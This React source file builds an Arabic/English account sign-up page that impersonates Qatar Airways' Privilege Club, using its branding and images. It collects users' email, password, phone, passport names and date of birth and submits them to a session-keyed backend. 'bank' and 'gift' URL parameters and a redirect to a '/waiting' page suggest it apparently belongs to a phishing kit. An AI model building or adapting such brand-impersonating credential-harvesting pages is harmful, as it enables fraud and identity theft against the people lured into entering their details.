import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import Header from "@/components/Header";
import { Eye, EyeOff, Check } from "lucide-react";

const TITLES = [
  { text: "سيد", value: "MR" },
  { text: "سيدة", value: "MRS" },
  { text: "آنسة", value: "MS" },
  { text: "دكتور", value: "DR" }
];

const COUNTRIES = [
  { text: "قطر", value: "QA" },
  { text: "الإمارات العربيّة المتّحدة", value: "AE" },
  { text: "المملكة العربية السعودية", value: "SA" },
  { text: "الكويت", value: "KW" },
  { text: "البحرين", value: "BH" },
  { text: "سلطنة عمان", value: "OM" },
  { text: "مصر", value: "EG" },
  { text: "الأردن", value: "JO" },
  { text: "لبنان", value: "LB" },
  { text: "المغرب", value: "MA" },
  { text: "الجزائر", value: "DZ" },
  { text: "تونس", value: "TN" },
  { text: "ليبيا", value: "LY" },
  { text: "السودان", value: "SD" },
  { text: "العراق", value: "IQ" },
  { text: "اليمن", value: "YE" },
  { text: "سوريا", value: "SY" },
  { text: "فلسطين", value: "PS" },
  { text: "المملكة المتحدة", value: "GB" },
  { text: "الولايات المتحدة الأمريكية", value: "US" },
  { text: "فرنسا", value: "FR" },
  { text: "ألمانيا", value: "DE" },
  { text: "تركيا", value: "TR" },
  { text: "الهند", value: "IN" },
  { text: "باكستان", value: "PK" }
];

const COUNTRY_CODES = [
  { text: "قطر (+974)", value: "974-QA" },
  { text: "الإمارات العربيّة المتّحدة (+971)", value: "971-AE" },
  { text: "المملكة العربية السعودية (+966)", value: "966-SA" },
  { text: "الكويت (+965)", value: "965-KW" },
  { text: "البحرين (+973)", value: "973-BH" },
  { text: "سلطنة عمان (+968)", value: "968-OM" },
  { text: "مصر (+20)", value: "20-EG" },
  { text: "الأردن (+962)", value: "962-JO" },
  { text: "لبنان (+961)", value: "961-LB" },
  { text: "المغرب (+212)", value: "212-MA" },
  { text: "الجزائر (+213)", value: "213-DZ" },
  { text: "تونس (+216)", value: "216-TN" },
  { text: "ليبيا (+218)", value: "218-LY" },
  { text: "السودان (+249)", value: "249-SD" },
  { text: "العراق (+964)", value: "964-IQ" },
  { text: "اليمن (+967)", value: "967-YE" },
  { text: "سوريا (+963)", value: "963-SY" },
  { text: "فلسطين (+970)", value: "970-PS" },
  { text: "المملكة المتحدة (+44)", value: "44-GB" },
  { text: "الولايات المتحدة الأمريكية (+1)", value: "1-US" },
  { text: "فرنسا (+33)", value: "33-FR" },
  { text: "ألمانيا (+49)", value: "49-DE" },
  { text: "تركيا (+90)", value: "90-TR" },
  { text: "الهند (+91)", value: "91-IN" },
  { text: "باكستان (+92)", value: "92-PK" }
];

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language } = useLanguage();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "doha";
  const sessionId = localStorage.getItem("sessionId") || "";

  const isArabic = language === "ar";
  
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    confirmPassword: "",
    countryCode: "974-QA",
    phoneNumber: "",
    title: "",
    nameEnglish: "",
    middleName: "",
    lastName: "",
    dateOfBirth: "",
    gender: "",
    country: "QA",
    promoCode: "",
  });

  const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    
    if (!currentSessionId) {
      toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
      return;
    }

    if (formData.password !== formData.confirmPassword) {
      toast.error(isArabic ? "كلمات المرور غير متطابقة" : "Passwords do not match");
      return;
    }

    try {
      await submitPersonalDataMutation.mutateAsync({
        sessionId: currentSessionId,
        email: formData.email,
        password: formData.password,
        phoneNumber: `${formData.countryCode.split('-')[0]}${formData.phoneNumber}`,
        title: formData.title,
        nameEnglish: formData.nameEnglish,
        middleName: formData.middleName,
        lastName: formData.lastName,
        dateOfBirth: formData.dateOfBirth,
        gender: formData.gender,
        country: formData.country,
        promoCode: formData.promoCode,
        nameArabic: "",
        idNumber: "",
      });
      
      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
      const giftId = params.get("gift") || "";
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}`);
    } catch (error) {
      console.error("Error saving personal data:", error);
      toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
    }
  };

  useEffect(() => {
    document.title = isArabic ? "إنشاء حساب | الخطوط الجوية القطرية" : "Join Now | Qatar Airways";
  }, [isArabic]);

  return (
    <div className="page-wrapper min-h-screen bg-white" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        .page-wrapper { font-family: 'Qatar Airways Next', sans-serif; color: #333; }
        .main-container { max-width: 1100px; margin: 0 auto; padding: 40px 20px; }
        .hero-section { background: url('https://www.qatarairways.com/content/dam/images/renditions/horizontal-1/campaigns/global/privilege-club/enrollment/enrollment-hero-desktop.jpg') center/cover; height: 300px; display: flex; align-items: center; justify-content: center; position: relative; border-radius: 8px; margin-bottom: 40px; }
        .hero-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.3); border-radius: 8px; }
        .hero-content { position: relative; z-index: 1; text-align: center; color: white; }
        .hero-content h1 { font-size: 36px; font-weight: bold; margin-bottom: 10px; }
        
        .benefits-grid { display: grid; grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap: 20px; margin-bottom: 50px; background: #f8f9fb; padding: 30px; border-radius: 8px; }
        .benefit-item { display: flex; align-items: center; gap: 12px; font-size: 14px; color: #555; }
        .check-icon { color: #8C0032; flex-shrink: 0; }

        .form-section { max-width: 800px; margin: 0 auto; }
        .form-title { font-size: 32px; font-weight: bold; color: #333; margin-bottom: 30px; text-align: center; }
        .section-header { font-size: 18px; font-weight: bold; color: #333; margin: 40px 0 20px; padding-bottom: 10px; border-bottom: 1px solid #eee; }
        
        .grid-layout { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media (max-width: 768px) { .grid-layout { grid-template-columns: 1fr; } }

        .input-group { margin-bottom: 25px; }
        .input-label { display: block; font-size: 14px; color: #666; margin-bottom: 8px; }
        .input-wrapper { position: relative; }
        .form-input { width: 100%; padding: 12px 16px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; transition: border-color 0.2s; }
        .form-input:focus { border-color: #8C0032; outline: none; }
        
        .password-hint { font-size: 12px; color: #777; margin-top: 8px; line-height: 1.5; }
        .password-toggle { position: absolute; ${isArabic ? 'left' : 'right'}: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #8C0032; }

        .radio-group { display: flex; gap: 30px; margin-top: 10px; }
        .radio-item { display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 16px; }
        .radio-item input { width: 20px; height: 20px; accent-color: #8C0032; }

        .checkbox-section { margin-top: 40px; border-top: 1px solid #eee; padding-top: 30px; }
        .checkbox-item { display: flex; gap: 12px; margin-bottom: 20px; font-size: 14px; color: #555; line-height: 1.6; }
        .checkbox-item input { width: 20px; height: 20px; flex-shrink: 0; accent-color: #8C0032; }
        .checkbox-item a { color: #8C0032; text-decoration: underline; }

        .submit-btn { background: #8C0032; color: white; width: 100%; padding: 18px; border-radius: 4px; font-weight: bold; font-size: 18px; margin-top: 30px; cursor: pointer; transition: background 0.2s; border: none; }
        .submit-btn:hover { background: #6b0026; }
        
        .footer-banner { width: 100%; margin-top: 60px; border-top: 1px solid #eee; padding-top: 40px; text-align: center; }
        .footer-banner img { max-width: 100%; height: auto; }
      `}</style>

      <Header />

      <div className="main-container">
        <div className="hero-section">
          <div className="hero-overlay"></div>
          <div className="hero-content">
            <h1>{isArabic ? "انضم إلى نادي الامتياز وابدأ بجمع نقاط أفيوس اليوم" : "Join Privilege Club and start collecting Avios today"}</h1>
          </div>
        </div>

        <div className="benefits-grid">
          {[
            isArabic ? "عروض حصرية لأعضاء نادي الامتياز" : "Exclusive offers for members",
            isArabic ? "اربح وأنفق نقاط أفيوس كما تشاء" : "Earn and spend Avios your way",
            isArabic ? "اجمع نقاط أفيوس مع عائلتك" : "Collect Avios with your family",
            isArabic ? "ساعة مجاناً من الإنترنت على متن الطائرة" : "One hour free Super Wi-Fi",
            isArabic ? "وفّر عند الدفع باستخدام cash + Avios" : "Save with Cash + Avios",
            isArabic ? "تسوّق وادفع في السوق الحرة القطرية" : "Shop and pay at Qatar Duty Free",
          ].map((text, i) => (
            <div key={i} className="benefit-item">
              <Check className="check-icon" size={18} />
              <span>{text}</span>
            </div>
          ))}
        </div>

        <div className="form-section">
          <h2 className="form-title">{isArabic ? "يمكنك إنشاء حساب خلال دقيقة واحدة فقط" : "You can create an account in just one minute"}</h2>

          <form onSubmit={handleSubmit}>
            <div className="section-header">{isArabic ? "دعنا ننشئ بيانات الاعتماد الخاصة بك." : "Let's create your credentials."}</div>
            
            <div className="input-group">
              <label className="input-label">{isArabic ? "عنوان البريد الإلكتروني" : "Email Address"}</label>
              <input type="email" name="email" className="form-input" value={formData.email} onChange={handleChange} required />
            </div>

            <div className="grid-layout">
              <div className="input-group">
                <label className="input-label">{isArabic ? "ادخل كلمة مرور" : "Enter Password"}</label>
                <div className="input-wrapper">
                  <input type={showPassword ? "text" : "password"} name="password" className="form-input" value={formData.password} onChange={handleChange} required />
                  <div className="password-toggle" onClick={() => setShowPassword(!showPassword)}>
                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </div>
                </div>
                <p className="password-hint">
                  {isArabic 
                    ? "يجب أن تتكون من 8 رموز على الأقل، منها رقم واحد وحرف كبير وحرف صغير ورمز خاص (!@#$%?&*)."
                    : "Must be at least 8 characters, including a number, uppercase, lowercase, and a special character (!@#$%?&*)."}
                </p>
              </div>

              <div className="input-group">
                <label className="input-label">{isArabic ? "إعادة إدخال كلمة المرور" : "Re-enter Password"}</label>
                <div className="input-wrapper">
                  <input type={showPassword ? "text" : "password"} name="confirmPassword" className="form-input" value={formData.confirmPassword} onChange={handleChange} required />
                </div>
              </div>
            </div>

            <div className="grid-layout">
              <div className="input-group">
                <label className="input-label">{isArabic ? "رمز البلد الهاتفي" : "Country Dialing Code"}</label>
                <select name="countryCode" className="form-input" value={formData.countryCode} onChange={handleChange} required>
                  {COUNTRY_CODES.map(c => <option key={c.value} value={c.value}>{c.text}</option>)}
                </select>
              </div>
              <div className="input-group">
                <label className="input-label">{isArabic ? "رقم الجوال" : "Mobile Number"}</label>
                <input type="tel" name="phoneNumber" className="form-input" value={formData.phoneNumber} onChange={handleChange} required />
              </div>
            </div>

            <div className="section-header">{isArabic ? "بياناتك الشخصية" : "Your Personal Details"}</div>

            <div className="grid-layout">
              <div className="input-group">
                <label className="input-label">{isArabic ? "اللقب" : "Title"}</label>
                <select name="title" className="form-input" value={formData.title} onChange={handleChange} required>
                  <option value="">{isArabic ? "اللقب" : "Title"}</option>
                  {TITLES.map(t => <option key={t.value} value={t.value}>{t.text}</option>)}
                </select>
              </div>
              <div className="input-group">
                <label className="input-label">{isArabic ? "الاسم الأول (كما في جواز السفر)" : "First Name (as in Passport)"}</label>
                <input type="text" name="nameEnglish" className="form-input" value={formData.nameEnglish} onChange={handleChange} required />
              </div>
            </div>

            <div className="grid-layout">
              <div className="input-group">
                <label className="input-label">{isArabic ? "الاسم الأوسط (اختياري)" : "Middle Name (Optional)"}</label>
                <input type="text" name="middleName" className="form-input" value={formData.middleName} onChange={handleChange} />
              </div>
              <div className="input-group">
                <label className="input-label">{isArabic ? "الاسم الأخير (كما في جواز السفر)" : "Last Name (as in Passport)"}</label>
                <input type="text" name="lastName" className="form-input" value={formData.lastName} onChange={handleChange} required />
              </div>
            </div>

            <div className="grid-layout">
              <div className="input-group">
                <label className="input-label">{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
                <input type="text" name="dateOfBirth" placeholder="DD/MM/YYYY" className="form-input" value={formData.dateOfBirth} onChange={handleChange} required />
              </div>
              <div className="input-group">
                <label className="input-label">{isArabic ? "النوع (اختياري)" : "Gender (Optional)"}</label>
                <div className="radio-group">
                  <label className="radio-item">
                    <input type="radio" name="gender" value="male" checked={formData.gender === 'male'} onChange={handleChange} />
                    {isArabic ? "ذكر" : "Male"}
                  </label>
                  <label className="radio-item">
                    <input type="radio" name="gender" value="female" checked={formData.gender === 'female'} onChange={handleChange} />
                    {isArabic ? "أنثى" : "Female"}
                  </label>
                </div>
              </div>
            </div>

            <div className="section-header">{isArabic ? "أين تقيم؟" : "Where do you reside?"}</div>
            
            <div className="input-group">
              <label className="input-label">{isArabic ? "دولة/قطاع الإقامة" : "Country/Sector of Residence"}</label>
              <select name="country" className="form-input" value={formData.country} onChange={handleChange} required>
                {COUNTRIES.map(c => <option key={c.value} value={c.value}>{c.text}</option>)}
              </select>
            </div>

            <div className="section-header">{isArabic ? "الرمز الترويجي لتسجيل الانضمام" : "Enrolment Promo Code"}</div>
            
            <div className="input-group">
              <label className="input-label">{isArabic ? "الرمز الترويجي (اختياري)" : "Promo Code (Optional)"}</label>
              <input type="text" name="promoCode" className="form-input" value={formData.promoCode} onChange={handleChange} />
            </div>

            <div className="checkbox-section">
              <div className="checkbox-item">
                <input type="checkbox" id="partners" />
                <label htmlFor="partners">{isArabic ? "أرغب في تلقي الأخبار والعروض من شركاء نادي الامتياز" : "I would like to receive news and offers from Privilege Club partners"}</label>
              </div>
              <div className="checkbox-item">
                <input type="checkbox" id="qatar_group" />
                <label htmlFor="qatar_group">
                  {isArabic ? "أرغب في تلقي الأخبار والعروض من شركات أخرى في " : "I would like to receive news and offers from other companies in "}
                  <a href="#">{isArabic ? "مجموعة الخطوط الجوية القطرية" : "Qatar Airways Group"}</a>
                </label>
              </div>
              <div className="checkbox-item">
                <input type="checkbox" id="terms" required />
                <label htmlFor="terms">
                  {isArabic 
                    ? "أوافق على شروط وأحكام نادي الامتياز وأتفهم أنه سيتم التعامل مع معلوماتي وفقاً لبيان خصوصية الخطوط الجوية القطرية." 
                    : "I agree to the Privilege Club Terms and Conditions and understand that my information will be handled in accordance with the Qatar Airways Privacy Notice."}
                </label>
              </div>
            </div>

            <button type="submit" className="submit-btn">
              {isArabic ? "إنشاء حساب" : "Create Account"}
            </button>
          </form>
        </div>

        <div className="footer-banner">
          <img src="https://www.qatarairways.com/content/dam/images/renditions/horizontal-1/campaigns/global/privilege-club/enrollment/enrollment-footer-desktop.jpg" alt="Privilege Club Footer" />
        </div>
      </div>
    </div>
  );
}
